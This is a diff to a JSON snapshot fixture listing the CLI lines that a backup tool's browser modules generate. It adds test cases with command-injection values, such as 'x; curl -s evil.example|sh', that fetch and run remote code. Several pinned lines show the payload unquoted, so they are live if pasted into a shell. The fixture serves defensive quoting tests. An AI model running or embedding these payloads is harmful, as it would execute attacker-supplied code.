@@ -1,389 +1,513 @@
 {
-  "about": "Every line the browser's twin modules print, for the inputs in ui/shared/src/test/cliTwins.1253.test.ts. core/cmd/retnd's TestEveryUITwinParses1253 runs each through the dispatcher. Re-pin with: npx vitest run -u src/test/cliTwins.1253.test.ts (from ui/shared)",
+  "about": "Every line the browser's twin modules print, for the inputs in ui/shared/src/test/cliTwins.test.ts. core/cmd/retnd's TestEveryUITwinParses runs each through the dispatcher and checks the sources below still hash the same. Re-pin with: npx vitest run -u src/test/cliTwins.test.ts (from ui/shared)",
+  "sources": [
+    {
+      "path": "ui/shared/src/assurance/assuranceCommands.ts",
+      "sha256": "d1fdc21e51efbf1c69465dab7e150529008f8d0b10938d347ed5a4fa8b45db47"
+    },
+    {
+      "path": "ui/shared/src/pages/destinationConfigureCommands.ts",
+      "sha256": "e146c768728a6215edf16a2179043894fb27f3cd8e864400a2f81bb27f422178"
+    },
+    {
+      "path": "ui/shared/src/pages/snapshotCommands.ts",
+      "sha256": "9433c99b6059731d02a90cd0794783d38e7cc0fc67f08c8f8947db1494e6f0aa"
+    },
+    {
+      "path": "ui/shared/src/pages/storageDestinationCommands.ts",
+      "sha256": "b4b8cc32d4a068ec5ac3bde9791d4b404fc677b2f07ff3cbe941e2161cc1b07d"
+    },
+    {
+      "path": "ui/shared/src/test/cliTwins.test.ts",
+      "sha256": "5f062dfa1f1532668ef20221d6375a0b6bea54799227e478a7fa34e045cba44a"
+    }
+  ],
   "twins": [
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "scrubCommand",
       "case": "a set",
       "line": "retnd scrub api-server/var-backups"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
+      "fn": "scrubCommand",
+      "case": "a hostile set id",
+      "line": "retnd scrub 'api-server/x; id|sh'"
+    },
+    {
+      "module": "assurance/assuranceCommands",
       "fn": "scrubContentCommand",
       "case": "a set",
       "line": "retnd scrub api-server/var-backups --content --allow-egress"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoveryTestCommand",
       "case": "a set",
       "line": "retnd recovery-test api-server/var-backups"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoveryTestArtifactCommand",
       "case": "one backup",
       "line": "retnd recovery-test api-server/var-backups --artifact api-server/var-backups/dump-2026-10-01.tar.gz"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
+      "fn": "recoveryTestArtifactCommand",
+      "case": "hostile ids",
+      "line": "retnd recovery-test 'api-server/x; id|sh' --artifact 'api-server/x; id|sh/y; id'"
+    },
+    {
+      "module": "assurance/assuranceCommands",
       "fn": "recoveryTestFollowCommand",
       "case": "a set",
       "line": "retnd recovery-test api-server/var-backups --follow"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "retryCommand",
       "case": "one backup",
       "line": "retnd retry api-server/var-backups/dump-2026-10-01.tar.gz"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "artifactCommand",
       "case": "one backup",
       "line": "retnd artifacts api-server/var-backups/dump-2026-10-01.tar.gz"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "artifactsInSetCommand",
       "case": "a set",
       "line": "retnd artifacts --backup-set api-server/var-backups"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "setTerminalCommand",
       "case": "a set",
       "line": "retnd activity --follow --backup-set api-server/var-backups"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "assuranceCancelCommand",
       "case": "an operation",
       "line": "retnd assurance cancel op_01JABCDEF"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "assuranceShowCommand",
       "case": "an operation",
       "line": "retnd assurance show op_01JABCDEF"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
+      "fn": "assuranceShowCommand",
+      "case": "an id from a crafted link",
+      "line": "retnd assurance show x; curl -s evil.example|sh"
+    },
+    {
+      "module": "assurance/assuranceCommands",
       "fn": "showOutputCommand",
       "case": "a set",
       "line": "retnd recovery-test api-server/var-backups --show-output"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "download",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to - > recovered-file"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "download, cost acknowledged",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --acknowledge-cost --to - > recovered-file"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "staging",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to restore/dump"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "staging, a name that reads as a flag",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to ./-dump --acknowledge-cost"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "staging, no name yet",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to <name>"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "storage",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to medium:offsite_s3 --acknowledge-cost"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "storage, no destination yet",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to medium:<id>"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "source",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to source:retnd-recovered-1"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverCommand",
       "case": "source, acknowledged",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to source:retnd-recovered-1 --acknowledge-source-write --acknowledge-cost"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
+      "fn": "recoverCommand",
+      "case": "a hostile id and folder",
+      "line": "retnd recover 'api-server/x; id|sh/y; id' --to 'source:x; curl -s evil.example|sh' --acknowledge-source-write --acknowledge-cost"
+    },
+    {
+      "module": "assurance/assuranceCommands",
       "fn": "recoverToFileCommand",
       "case": "one backup",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to - > dump-2026-10-01.tar.gz"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
+      "fn": "recoverToFileCommand",
+      "case": "a hostile file name",
+      "line": "retnd recover 'api-server/x; id|sh/y; id' --to - > 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "assurance/assuranceCommands",
       "fn": "recoverSetCommand",
       "case": "all, staging",
       "line": "retnd recover --set api-server/var-backups --to restore"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverSetCommand",
       "case": "newest, storage",
       "line": "retnd recover --set api-server/var-backups --newest-only --to medium:offsite_s3 --acknowledge-cost"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverSetCommand",
       "case": "since, staging",
       "line": "retnd recover --set api-server/var-backups --since 2026-10-01 --to restore"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverSetCommand",
       "case": "since, no date yet",
       "line": "retnd recover --set api-server/var-backups --since <date> --to restore"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverSetCommand",
       "case": "all, source",
       "line": "retnd recover --set api-server/var-backups --all --to source:retnd-recovered-1 --acknowledge-source-write"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverManyCommand",
       "case": "staging",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz api-server/var-backups/dump-2026-10-01.tar.gz.2 --to restore"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverManyCommand",
       "case": "storage",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to medium:offsite_s3 --acknowledge-cost"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "recoverManyCommand",
       "case": "source",
       "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz --to source:retnd-recovered-1 --acknowledge-source-write"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
+      "fn": "recoverManyCommand",
+      "case": "hostile ids",
+      "line": "retnd recover 'api-server/x; id|sh/y; id' 'api-server/x; id|sh/y; id' --to 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "assurance/assuranceCommands",
       "fn": "recoverSetPreflightCommand",
       "case": "since, storage",
       "line": "retnd recover --set api-server/var-backups --since 2026-10-01 --to medium:offsite_s3 --preflight"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "snapshotRestoreCommand",
       "case": "a set",
       "line": "retnd snapshot restore api-server/var-backups --to <dir>"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "thawCommand",
       "case": "one backup",
       "line": "retnd restore api-server/var-backups/dump-2026-10-01.tar.gz --medium <id> --acknowledge"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "settingsCommand",
       "case": "nothing pending",
       "line": "retnd settings assurance patch --scrub-cadence <duration>"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "settingsCommand",
       "case": "every field",
       "line": "retnd settings assurance patch --scrub-cadence 48h --scrub-strategy content --recovery-test-mode custom --recovery-test-cadence 1m30s --recovery-test-validator pg-dump-check --recovery-test-builtin-check structure"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "setAssuranceCommand",
       "case": "reset",
       "line": "retnd backup-set assurance api-server/var-backups --reset"
     },
     {
-      "module": "assuranceCommands",
+      "module": "assurance/assuranceCommands",
       "fn": "setAssuranceCommand",
       "case": "own policy",
       "line": "retnd backup-set assurance api-server/var-backups --scrub-cadence 1h --recovery-test-mode builtin"
     },
     {
-      "module": "destinationConfigureCommands",
+      "module": "pages/destinationConfigureCommands",
       "fn": "configureCommand",
       "case": "a local volume",
-      "line": "retnd medium configure usb_disk --backend local_volume --field 'path=/mnt/usb disk' --field prefix=retnd"
+      "line": "retnd medium configure usb_disk --backend local_volume --field 'path=/mnt/usb disk' --field prefix=retnd --field upload_verification=readback"
     },
     {
-      "module": "destinationConfigureCommands",
+      "module": "pages/destinationConfigureCommands",
       "fn": "configureCommand",
       "case": "s3, by reference",
       "line": "retnd medium configure cold --backend s3 --field bucket=acme --field endpoint=https://s3.example.test --field region=eu-central-1 --field storage_class=DEEP_ARCHIVE --credentials-id cred_1"
     },
     {
-      "module": "destinationConfigureCommands",
+      "module": "pages/destinationConfigureCommands",
       "fn": "configureCommand",
       "case": "s3, an endpoint the cut can't read",
       "line": "retnd medium configure cold --backend s3 --field bucket=acme --field <endpoint=the value, left out because it looks like it carries credentials>"
     },
     {
-      "module": "destinationConfigureCommands",
+      "module": "pages/destinationConfigureCommands",
+      "fn": "configureCommand",
+      "case": "a hostile id and value",
+      "line": "retnd medium configure 'x; curl -s evil.example|sh' --backend s3 --field 'bucket=x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "pages/destinationConfigureCommands",
       "fn": "preflightCommand",
       "case": "s3",
       "line": "retnd medium configure cold --backend s3 --field bucket=acme --field region=eu-central-1 --credentials-id cred_1 --preflight"
     },
     {
-      "module": "destinationConfigureCommands",
+      "module": "pages/destinationConfigureCommands",
       "fn": "importCredentialsCommand",
       "case": "no argument",
       "line": "retnd medium import-credentials --stdin"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "snapshotVerifyCommand",
       "case": "newest",
       "line": "retnd snapshot verify api-server/var-backups"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "snapshotVerifyCommand",
       "case": "one run",
       "line": "retnd snapshot verify api-server/var-backups --run run_1"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "snapshotHoldCommand",
       "case": "newest",
       "line": "retnd snapshot hold api-server/var-backups --reason 'kept for the incident review'"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "snapshotHoldCommand",
       "case": "one run",
       "line": "retnd snapshot hold api-server/var-backups --reason 'it'\\''s evidence' --run run_1"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "snapshotUnholdCommand",
       "case": "one hold",
       "line": "retnd snapshot unhold api-server/var-backups hold_1"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
+      "fn": "snapshotUnholdCommand",
+      "case": "hostile ids",
+      "line": "retnd snapshot unhold 'api-server/x; id|sh' 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "pages/snapshotCommands",
       "fn": "snapshotRestoreCommand",
       "case": "the whole tree",
       "line": "retnd snapshot restore api-server/var-backups --to /srv/restored"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "snapshotRestoreCommand",
       "case": "every option",
       "line": "retnd snapshot restore api-server/var-backups --to '/srv/restored here' --snapshot k1234 --path var/lib/pg --conflict skip"
     },
     {
-      "module": "snapshotCommands",
+      "module": "pages/snapshotCommands",
       "fn": "retentionApplyCommand",
       "case": "a set",
       "line": "retnd retention apply api-server/var-backups --acknowledge"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "importCredentialsCommand",
       "case": "no argument",
       "line": "retnd medium import-credentials --stdin"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "testConnectionCandidateCommand",
       "case": "by reference",
-      "line": "retnd medium test-connection --candidate offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification content_md5 --credentials-id cred_1"
+      "line": "retnd medium test-connection --candidate offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback --credentials-id cred_1"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "addCommand",
       "case": "a credentials file",
-      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification content_md5 --credentials-file /etc/retnd/s3.ini"
+      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback --credentials-file /etc/retnd/s3.ini"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "addCommand",
       "case": "a credentials variable",
-      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification content_md5 --credentials-env RETND_S3"
+      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback --credentials-env RETND_S3"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "addCommand",
       "case": "a credentials command",
-      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification content_md5 --credentials-command <the command that prints these credentials>"
+      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback --credentials-command <the command that prints these credentials>"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "addCommand",
       "case": "an endpoint with userinfo",
-      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://minio.internal:9000 --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification content_md5"
+      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint https://minio.internal:9000 --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "addCommand",
       "case": "an endpoint the cut can't read",
-      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint <the value, left out because it looks like it carries credentials> --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification content_md5"
+      "line": "retnd medium add offsite_s3 --type s3 --region eu-central-1 --endpoint <the value, left out because it looks like it carries credentials> --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
+      "fn": "addCommand",
+      "case": "an id still being typed",
+      "line": "retnd medium add x; curl -s evil.example|sh --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
       "fn": "editCommand",
       "case": "the bare minimum",
       "line": "retnd medium edit offsite_s3 --type s3 --bucket acme"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
+      "fn": "editCommand",
+      "case": "by reference",
+      "line": "retnd medium edit offsite_s3 --type s3 --bucket acme --credentials-id cred_1"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
+      "fn": "editCommand",
+      "case": "a credentials file",
+      "line": "retnd medium edit offsite_s3 --type s3 --bucket acme --credentials-file /etc/retnd/s3.ini"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
+      "fn": "editCommand",
+      "case": "a credentials command",
+      "line": "retnd medium edit offsite_s3 --type s3 --bucket acme --credentials-command <the command that prints these credentials>"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
       "fn": "testConnectionCommand",
       "case": "a destination",
       "line": "retnd medium test-connection offsite_s3"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
+      "fn": "testConnectionCommand",
+      "case": "a hostile id",
+      "line": "retnd medium test-connection x; curl -s evil.example|sh"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
       "fn": "setDefaultCommand",
       "case": "a destination",
       "line": "retnd medium default offsite_s3"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
+      "fn": "setDefaultCommand",
+      "case": "a hostile id",
+      "line": "retnd medium default x; curl -s evil.example|sh"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
       "fn": "tierMediumCommand",
       "case": "local",
       "line": "retnd settings patch --tier-medium daily=local"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
       "fn": "tierMediumCommand",
       "case": "elsewhere",
       "line": "retnd settings patch --tier-medium monthly=offsite_s3 --acknowledge-medium-disclosure"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
+      "fn": "tierMediumCommand",
+      "case": "hostile names",
+      "line": "retnd settings patch --tier-medium x; curl -s evil.example|sh=x; curl -s evil.example|sh --acknowledge-medium-disclosure"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
       "fn": "removeCommand",
       "case": "a destination",
       "line": "retnd medium remove offsite_s3"
     },
     {
-      "module": "storageDestinationCommands",
+      "module": "pages/storageDestinationCommands",
+      "fn": "removeCommand",
+      "case": "a hostile id",
+      "line": "retnd medium remove x; curl -s evil.example|sh"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
       "fn": "showCommand",
       "case": "a destination",
       "line": "retnd medium show offsite_s3"
+    },
+    {
+      "module": "pages/storageDestinationCommands",
+      "fn": "showCommand",
+      "case": "a hostile id",
+      "line": "retnd medium show x; curl -s evil.example|sh"
     }
   ]
 }
